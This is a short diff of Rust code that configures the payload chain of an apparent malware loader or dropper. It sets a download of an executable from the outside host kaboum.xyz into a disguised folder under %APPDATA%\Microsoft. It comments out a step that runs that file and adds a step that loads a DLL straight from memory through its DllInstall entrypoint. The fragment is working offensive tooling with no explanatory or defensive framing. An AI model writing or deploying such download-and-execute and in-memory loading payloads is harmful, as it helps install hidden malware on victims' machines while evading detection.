@@ -202,14 +202,27 @@ exec(decoded_script)
                 url:String::from("https://kaboum.xyz/artdonjon/local_mtls_1080.exe"),
                 dataoperation: vec![],        
             jitt:0,
-            sleep:0
-        }),
-        path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string() }),
+            sleep:0        }),
+            path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string() }),
+
+        /* 
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe"),
             cmdline:String::from(""),
             thread:false
         }),
+*/
+
+        Payload::DllFromMemory(DllFromMemory {
+            link: Link::MEMORY(MemoryLink {
+                memory_nb: 2,
+                dataoperation: vec![],
+                jitt: 0,
+                sleep: 0,
+            }),
+            dll_entrypoint: String::from("DllInstall"),
+            thread: true,
+        })
 
         ];
     } else {
